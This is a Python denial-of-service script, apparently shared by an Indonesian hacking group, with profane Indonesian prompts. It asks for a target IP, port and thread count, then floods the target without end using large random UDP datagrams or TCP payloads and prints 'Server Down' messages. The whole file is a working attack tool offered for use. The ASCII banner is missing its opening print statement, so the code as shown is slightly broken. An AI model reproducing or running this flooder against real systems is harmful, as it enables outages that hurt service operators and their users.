#Autor By Xalbador
#Remake By 4CEE
#Dont Remove Credit
import random
import socket
import threading
import os

os.system("clear")
██╗░░██╗██████╗░
╚██╗██╔╝██╔══██╗
░╚███╔╝░██████╔╝
░██╔██╗░██╔══██╗
██╔╝╚██╗██║░░██║
╚═╝░░╚═╝╚═╝░░╚═╝""")
print("#-- TOOLS DDOS BY XR COMUNITY --#")
print("--> KALAU MAU PAKEK SUBSCRIBE DULU KONTOL <--")
print("#-- TOOLS BY XR COMUNITY DONT FCKING ABUSE --#")
ip = str(input(" Masukan IP:"))
port = int(input(" Port:"))
choice = str(input(" Gas Ddos Gak ni?(y/n):"))
times = int(input(" Mau Berapa Packets?:"))
threads = int(input(" Isi Packets Threads?:"))
def run():
	data = random._urandom(20000)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" Send Packet By XR Comunity!!!")
		except:
			print("[!] Send Packet By XR Comunity!!!")

def run2():
	data = random._urandom(696969)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" Send Packet By XR Comunity!!!")
		except:
			s.close()
			print("[*] Server Down !!!")

for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
	else:
		th = threading.Thread(target = run2)
		th.start()